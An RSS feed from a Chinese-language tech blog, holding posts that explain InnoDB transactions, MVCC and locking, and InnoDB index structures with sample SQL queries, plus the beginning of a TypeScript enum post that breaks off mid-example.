<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ChuckLin's Blog</title><link>https://www.chucklin.net/</link><description>Recent content on ChuckLin's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Copyright © 2021 Chuck Lin. All rights reserved.</copyright><lastBuildDate>Tue, 14 Sep 2021 16:30:57 +0800</lastBuildDate><atom:link href="https://www.chucklin.net/index.xml" rel="self" type="application/rss+xml"/><item><title>事务与锁的设计思想</title><link>https://www.chucklin.net/post/transcation_lock/</link><pubDate>Tue, 14 Sep 2021 16:30:57 +0800</pubDate><guid>https://www.chucklin.net/post/transcation_lock/</guid><description>&lt;p>事务是一个抽象的概念，代表一个或多个数据库操作。比如下面这三组查询语句 A、B、C 分别代表三个事务。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">SET&lt;/span> autocommit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">ON&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> A
&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> B
&lt;span style="color:#66d9ef">begin&lt;/span>
&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span>;
&lt;span style="color:#66d9ef">commit&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">C&lt;/span>
&lt;span style="color:#66d9ef">begin&lt;/span>
&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span>;
&lt;span style="color:#66d9ef">update&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">set&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;cherry&amp;#39;&lt;/span>;
&lt;span style="color:#66d9ef">commit&lt;/span>;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个只有一条语句的操作(A)也是一个事务。所以实际上不存在「没有事务」的概念。&lt;/p>
&lt;h3 id="trx_id">trx_id&lt;/h3>
&lt;p>和 record 一样，事务也拥有自己的主键。如果一个事务中包含了 modify 语句，那这个事务就会被分配一个全局递增的数字作为这个事务的主键，主键的名称为 trx_id。&lt;/p>
&lt;h3 id="undo-与版本链">undo 与版本链&lt;/h3>
&lt;p>事务操作必须具备原子性；原子性意味着操作能够回滚(rollback)；回滚需要历史记录；历史记录想要保留，最简单的方法是每次 modify 之前都把当前记录保存下来，这样就能在任何时候回到过去了。&lt;/p>
&lt;p>保留下来的历史记录称做撤销日志(undo log)；保存 undo log 的页面类型为 FILE_PAGE_UNDO_LOG；多个 undo page 之间使用指针链接成链表；整个 undo chain 和 record chain 共同形成了一个版本控制系统。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/transcation_lock/undo.jpg" alt="undo">&lt;/p>
&lt;h3 id="版本号">版本号&lt;/h3>
&lt;p>前文提到，凡是修改记录的事务都会分配一个全局递增的标识符 trx_id。如果每次修改 record 时都把分配的 trx_id 写入记录的 head 部分的话，就能够溯源记录的事务操作。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/transcation_lock/version.jpg" alt="undo">&lt;/p>
&lt;p>被写入记录的 trx_id 就像 undo chain 的版本号一样，同一个事务操作生成的内容拥有相同的版本号；不同的版本号根据 trx_id 的递增特性可以推断出事务发生的先后顺序。
回滚事务时，只要把该版本号对应的 undo 全部执行一次即可。&lt;/p>
&lt;h3 id="并发控制">并发控制&lt;/h3>
&lt;p>多个操作并发修改相同的资源就会发生并发安全问题。 innodb 根据操作类型(读或写)与隔离等级，对并发安全问题提供了不同程度的解决方案。&lt;/p>
&lt;h4 id="readview">ReadView&lt;/h4>
&lt;p>一般来讲，读操作并不涉及资源的修改，所以没有安全问题。但是如果我们使用的事务隔离等级是 REPEATABLE READ 的话就另当别论了 。REPEATABLE READ 要求一个事务只能读取到已提交的事务修改过的记录。&lt;/p>
&lt;p>那如何才能判断版本链中哪些记录是当前事务开启时已提交的事务产生的记录呢？上文提到的版本号提供了判断事务发生顺序的线索。简单来说，根据版本号的大小就可以判断某条记录对当前事务是否可见。&lt;/p>
&lt;p>不过实际情况肯定要复杂些。innodb 采取的方案是在事务开启时，对当前系统中的事务获取一个称为一致性视图的快照(ReadView)。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>key&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>m_ids&lt;/td>
&lt;td>当前系统中，活跃的事务 id&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>min_trx_id&lt;/td>
&lt;td>当前系统中，活跃的事务 id 最小值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>max_trx_id&lt;/td>
&lt;td>系统应该分配下一个事务的 id&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>creator_trx_id&lt;/td>
&lt;td>当前事务的 id&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>有了 ReadView，只需要按照固定的步骤把某条记录的 trx_id 和视图中的 trx_id 做比较，就可以判断该记录是否对当前事务可见了。如果最新的记录不可见，则顺着版本链寻找 undo 日志中匹配的内容，直到到达链表的尾部。&lt;/p>
&lt;p>这种使用版本号来控制记录可见性的做法，叫做多版本并发控制系统，简称 MVCC。&lt;/p>
&lt;h3 id="lock">Lock&lt;/h3>
&lt;p>使用了 MVCC 方案的读操作叫做快照读(Consistent Read)——他读取的是当前对事务可见的记录。可见的记录既可能是最新记录，也可能是历史记录。
还有一种读取操作只会读取最新的记录，不会读取历史记录。这种读取操作叫做当前读。
另外，写入操作也总是面向版本链最新记录的，所以写操作也是当前读的一种形式。&lt;/p>
&lt;p>并发写一般都是有安全问题的。在数据库领域中并发写的安全问题主要是脏写：&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/transcation_lock/zx1.jpg" alt="undo">&lt;/p>
&lt;p>假设有两个事务 trx1、trx2 同时更新同一条记录的某列为 B、A；&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/transcation_lock/zx2.jpg" alt="undo">&lt;/p>
&lt;p>在两个事务提交之前 trx1 先进行回滚，接着再提交 trx2，然后版本链中的最新记录就会回滚为 trx0 所在的记录。也就是说，trx2 虽然提交了数据，却没有在数据库产生一致性结果，我们称这种情况为更新丢失。&lt;/p>
&lt;blockquote>
&lt;p>更新丢失不是更新覆盖，更新覆盖常用在 read-compute-write 类型的操作上。指后一个操作的结果覆盖了前一个操作的内容。这些记录在版本链中没有丢失，而是旧记录被新纪录覆盖了。&lt;/p>
&lt;/blockquote>
&lt;p>发生更新丢失的本质原因是因为两个事务同时针对同一条记录进行修改，其中 trx1 的回滚操作覆盖了 trx2 事务写入的数据所造成的。
为了解决这样的问题，innodb 提供的解决方案就是 Lock。&lt;/p>
&lt;p>存储引擎的加锁方案牵扯的变量因素非常多，本文篇幅有限无法详尽讨论。接下来只通过一个 modify 语句作为示例来简要说明在 REPEATABLE READ 隔离等级下的加锁过程。&lt;/p>
&lt;h4 id="加锁过程分析">加锁过程分析&lt;/h4>
&lt;p>在数据库中新建二级索引和聚簇索引如下：&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/transcation_lock/lock1.jpg" alt="undo">&lt;/p>
&lt;p>使用下面的语句更新上图中的记录。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">update&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">set&lt;/span> col3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;test&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> col2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;f&amp;#39;&lt;/span>;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>分析加锁过程：&lt;/p>
&lt;ol>
&lt;li>查询语句的查询条件生成扫描区间 &lt;code>(f,f)&lt;/code>。&lt;/li>
&lt;li>查询二级索引，定位满足扫描区间的第一条记录 &lt;code>col2=f&lt;/code> 。&lt;/li>
&lt;li>为 &lt;code>col2=f&lt;/code> 的记录加上 next-key 排它锁。&lt;/li>
&lt;li>回表扫描聚簇索引，为 &lt;code>id=7&lt;/code> 的记录加上 next-key 排它锁。&lt;/li>
&lt;li>查询二级索引链表中 &lt;code>col2=f&lt;/code> 的下一条记录。并为查询到的记录加上 next-key 排它锁。&lt;/li>
&lt;li>回表扫描二级索引对应的聚簇索引，并对该聚簇索引加上 next-key 排它锁。&lt;/li>
&lt;li>重复上述步骤直到遍历完扫描区间中的记录项。&lt;/li>
&lt;/ol>
&lt;p>加锁完成的结果如下图所示：&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/transcation_lock/lock2.jpg" alt="undo">&lt;/p>
&lt;blockquote>
&lt;p>如果查询语句无法利用索引，那查询条件生成的扫描区间就是 $(-\infty,+\infty)$，最后加锁的范围就是全表。&lt;/p>
&lt;/blockquote>
&lt;p>记录一旦加上了排它锁，在锁被释放之前任何其他事务都无法对当前记录做出更改，这样就解决了脏写的问题。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>innodb 解决并发事务的一致性问题主要依靠两个方案—— MVCC 和 Lock。&lt;/p>
&lt;ol>
&lt;li>MVCC 方案解决了「读操作」的并发问题：
&lt;ul>
&lt;li>脏读。&lt;/li>
&lt;li>幻读。&lt;/li>
&lt;li>不可重复读的问题。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Lock 方案解决了「写操作」的并发问题：
&lt;ul>
&lt;li>脏写。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>使用 MVCC 的读操作也称为快照读，因为它读取的内容可能是历史数据；写操作是当前读的一种形式，因为他总是面向最新记录写入数据。&lt;/p></description></item><item><title>索引的物理结构</title><link>https://www.chucklin.net/post/index_principle/</link><pubDate>Wed, 08 Sep 2021 14:28:26 +0800</pubDate><guid>https://www.chucklin.net/post/index_principle/</guid><description>&lt;h2 id="行的格式">行的格式&lt;/h2>
&lt;p>在 innodb 存储引擎中，一个表中的记录(records)会使用固定的行格式，根据字符集的比较规则按主键顺序存储到硬盘上。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/row.jpg" alt="row">&lt;/p>
&lt;p>比如上图中的行格式就规定：除了保存记录的列信息以外，还需要在行中保存额外的信息。如：变长字段的占位长度、空值的列、行的(head)信息等。
行的头信息中有一个名为 next_record 的指针。这个指针指向下一条记录在磁盘上的偏移量，行之间通过这个指针构成一个链表。&lt;/p>
&lt;h2 id="页">页&lt;/h2>
&lt;p>innodb 每次从磁盘检索并加载数据，都以页（16KB/页）为单位。为此 mysql 设计了各式各样的页用来存储不同种类的数据，其中用来保存用户数据的页称为索引页/数据页。&lt;/p>
&lt;p>一个简化的数据页结构如下：&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/page.jpg" alt="page">&lt;/p>
&lt;p>可以看到，这个数据页除了保存 records 以外，还保存了页的元数据(meta data)：比如页目录、页头、页尾等。&lt;/p>
&lt;h3 id="页目录">页目录&lt;/h3>
&lt;p>因为页中的 records 使用 next_record 指针构成一个链表，所以查找 records 中某一行数据的问题就是已知一个链表的地址，查找这个链表中的节点的问题。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">查找链表中&lt;/span> id &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">的节点&lt;/span>
&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> id &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一般来讲，查找链表中的节点通常采用线性查找法来实现。但是线性查找法的时间复杂度是 $O(n$)，如果数据量较大，那这个时间复杂度就难以让人接受。于是，为了提高查询的效率，innodb 使用了「目录」的抽象方案。&lt;/p>
&lt;p>首先将 record 进行逻辑分组，再将每组中最大的记录在磁盘上的偏移量集中存储到一起；当查询某条记录时，先查询记录所在的分组(文件目录)，再进入组内(目录内)查找，这样就缩小了线性查找的范围。&lt;/p>
&lt;p>又因为 record 按照主键排序的特性，在查询记录所属的分组时同样可以利用二分查找将查询处理的时间复杂度降低为 $O(\log n)$。&lt;/p>
&lt;p>页中集中存储各分组在磁盘上的偏移量的空间，被称为页目录(Page Directory)。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/page-dir.jpg" alt="directory">&lt;/p>
&lt;h2 id="聚簇索引">聚簇索引&lt;/h2>
&lt;p>页的大小是有限的（16KB）。如果表中的记录超出了这个容量，那就得使用多个页来存储 records， 再通过指针将页关联起来，形成一个页的双向链表。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/page-dirs.jpg" alt="dirs">&lt;/p>
&lt;p>所以当使用多个页存储数据时，查询 record 的工作就变为了两步：&lt;/p>
&lt;ol>
&lt;li>确定记录所在的页的地址（页号）。&lt;/li>
&lt;li>通过页目录查找记录在页中的偏移量。&lt;/li>
&lt;/ol>
&lt;p>因为数据页是链表的结构，所以通过线性查找法肯定可以找到被查找记录所在的页；但是，在数据量较大时线性查找法的性能依然存在问题。&lt;/p>
&lt;p>那么，是否可以参考页目录的设计将页进行分组呢？先按照页号分组，并保证分组按照数据页中用户记录的主键进行排序，最后再用一个数据页作为分组后的目录，保存各组中数据页内最小的主键值。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/index.jpg" alt="index">&lt;/p>
&lt;p>现在，针对页的分组操作，使页的结构从链表转化为了一颗 B+ 树。
树根所在的节点就是根页(root page)；树的内节点是目录项页，用来存储主键与页号的映射；树的叶节点存储完整的记录；整颗树就称为聚簇索引。&lt;/p>
&lt;p>假设我们使用主键（或者唯一二级索引）的等值为条件对这个聚簇索引进行查询的话，那这个查询的速度会像火箭一样快。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> id &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">output&lt;/span>: id:&lt;span style="color:#ae81ff">5&lt;/span> code:b
&lt;/code>&lt;/pre>&lt;/div>&lt;p>innodb 会先利用二分查找在聚簇索引的目录项中定位到 &lt;code>id=5&lt;/code> 的记录位于页号为 2 的页中；然后在 page2 的页目录（Page directory） 里搜索&lt;code>id=5&lt;/code> 的记录在页中的偏移量，就能轻松获取到记录内容。&lt;/p>
&lt;p>像这样和火箭一样快的查询方法，我们称之为常数方法（const）—— 因为他的效率就和 $O(1$) 一样好。&lt;/p>
&lt;h2 id="二级索引">二级索引&lt;/h2>
&lt;p>针对非主键建立的索引就是二级索引。相比聚簇索引，二级索引的叶节点只存储了两类信息：索引项与索引项对应的主键。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/ref.jpg" alt="ref">&lt;/p>
&lt;p>由于二级索引没有存储 record 的完整信息，所以针对二级索引的查询工作就变成了三步：&lt;/p>
&lt;ol>
&lt;li>确定记录所在的页。&lt;/li>
&lt;li>在页中通过页目录查找记录。&lt;/li>
&lt;li>根据第二步记录的主键，回聚簇索引查找完整的内容。&lt;/li>
&lt;/ol>
&lt;p>通过二级索引进行查询的方法称为 ref 查询方法，回聚簇索引查询完整记录的动作被称为回表扫描。因为这样的缘故，ref 查询方法的性能要比 const 方法低一些。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">output&lt;/span>: code:a id:&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是，假设只根据二级索引查询 id（主键）的信息，那么就不需要回表扫描了，因为二级索引本身包含了被查询列的信息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">output&lt;/span>: id:&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不需要回表扫描，二级索引直接返回结果的查询方法叫做索引覆盖（index）查询方法。&lt;/p>
&lt;h2 id="联合索引">联合索引&lt;/h2>
&lt;p>假如一个二级索引由多个字段组成，那这个二级索引就是一个联合索引。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/index-principal/union-index.jpg" alt="union">&lt;/p>
&lt;p>针对联合索引进行查询要注意查询条件需遵守「左前缀原则」——这是由联合索引的底层构造所决定的，不然就无法利用联合索引进行查询。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">//&lt;/span> A
&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> code2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;b&amp;#39;&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">output&lt;/span>: id:&lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#f92672">//&lt;/span> B
&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">output&lt;/span>: id:&lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">C&lt;/span>
&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> code &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>;
&lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#66d9ef">output&lt;/span>: id:&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面的语句中，A 语句和 B 语句的查询条件 &lt;code>[(code &amp;amp;&amp;amp; code2),(code)]&lt;/code> 和联合索引 &lt;code>(code,code2)&lt;/code> 的索引字段顺序一致，可以通过索引树提高查找效率。
但是由于 B 语句的查询条件不符合索引字段的顺序，所以无法利用索引树提高查询效率。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">//&lt;/span> D
&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> code2 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;g&amp;#39;&lt;/span>
&lt;span style="color:#f92672">//&lt;/span> E
&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> code2 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;g&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> id &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询语句 D 是一个针对联合索引的范围查询 (Range)。因为联合索引按照&lt;code>(code,code2)&lt;/code>排序，所以查询条件&lt;code>(code,code2)&lt;/code>可以形成一个关于索引项的扫描区间 $[(a,\forall),(a,g)]$ ；这个扫描区间有助于减少索引项的扫描范围，所以他是一个有效的扫描区间。也就是说，查询语句 D 可以利用索引提高查询效率。&lt;/p>
&lt;p>查询语句 E 中相比 D 增加了一个 &lt;code>id=6&lt;/code> 的条件，这个条件并不是联合索引的排序字段，所以它不能提供有效的扫描区间。凡是无法形成有效扫描区间的查询条件，在索引的利用分析中都可以用 TRUE 替换掉。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">//&lt;/span> E
&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> code2 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;g&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再对替换后的查询语句中，使用 and 连接的查询条件各自形成的扫描区间求交集：$(-\infty,+\infty) \cup [(a,\forall),(a,g)] = [(a,\forall),(a,g)]$ 得出查询语句 E 可以利用索引提高查询效率的结论。&lt;/p>
&lt;h2 id="使用索引排序和分组">使用索引排序和分组&lt;/h2>
&lt;h4 id="排序">排序&lt;/h4>
&lt;p>对于大数据量进行排序是比较耗时的，这不仅仅是在内存中运行排序算法的 CPU 成本，还有将排序的中间结果保存到磁盘造成的 IO 成本。
但是若利用索引的物理结构本身有序的特性，就可以省去额外的排序工作。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">//&lt;/span> F
&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">where&lt;/span> code &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> code2 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;g&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> code;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面已经提到过，F 这个查询语句会根据扫描区间扫描二级索引并回表查询记录。当完成扫描区间的二级索引回表查询的工作并整合结果集后，由于查询语句的排序条件联合索引的顺序一直，所以省去了额外的排序的步骤，innodb 可以直接将结果集返回给客户端。&lt;/p>
&lt;h4 id="分组">分组&lt;/h4>
&lt;p>分组操作如果缺少索引，innodb 会在扫描聚簇索引的记录时，新建一个临时表来存储分组的统计结果。统计完成后，将临时表的内容发送给客户端。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">count&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>) &lt;span style="color:#66d9ef">from&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">group&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> code, code2
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果分组的字段有索引，并且顺序和索引顺序相同，那就没有必要建立中间表进行统计了，直接使用索引项就可以完成分组。&lt;/p>
&lt;h2 id="表连接中的索引">表连接中的索引&lt;/h2>
&lt;p>表连接的执行方式是嵌套循环链接(Nested-Loop Join)——根据连接的方式(内外)和方向(左右)针对驱动表和被驱动表分别做单表查询。驱动表查询出的记录数量，就是被驱动表的查询次数。
所以表连接的索引问题就是单表索引的问题。而这部分的知识已经在上面的内容介绍过了。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;ol>
&lt;li>记录按照行格式存储在磁盘，并根据头指针构成链表。&lt;/li>
&lt;li>记录按照逻辑分组被存储在页中，分组信息保存在页目录中。&lt;/li>
&lt;li>关联页使用构成链表。&lt;/li>
&lt;li>对页的目录抽象又把链表升级为树。&lt;/li>
&lt;li>排序、分组、目录结构抽象是索引能够加速查询的重要物理特性。&lt;/li>
&lt;li>聚簇索引是主键索引。&lt;/li>
&lt;li>聚簇索引体现了索引即数据——索引树的页节点保存了索引项与记录项。&lt;/li>
&lt;li>二级索引是非主键索引——索引树页结点只保存索引项与主键。&lt;/li>
&lt;li>表链接的索引问题就是多个单表的索引问题。&lt;/li>
&lt;li>索引能否生效的关键，在于查询条件是否能够减少聚簇索引的扫描范围。&lt;/li>
&lt;/ol></description></item><item><title>Enum in Typescript</title><link>https://www.chucklin.net/post/ts_enum/</link><pubDate>Mon, 26 Jul 2021 22:16:36 +0800</pubDate><guid>https://www.chucklin.net/post/ts_enum/</guid><description>&lt;h2 id="枚举">枚举&lt;/h2>
&lt;p>枚举是对客观事物的归纳与自然语言的抽象。这听起来似乎容易和类混淆，这是正常的。因为在大部分面向对象的语言里，枚举就是类。&lt;/p>
&lt;p>我们知道一周有七天 —— &lt;code>Week={monday,Tuesday,...., Sunday}&lt;/code>。假设用枚举来描述这个概念的话就是下面这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">enum&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span> {
&lt;span style="color:#a6e22e">Monday&lt;/span>,
&lt;span style="color:#a6e22e">Tuesday&lt;/span>,
&lt;span style="color:#a6e22e">Sunday&lt;/span>,
}
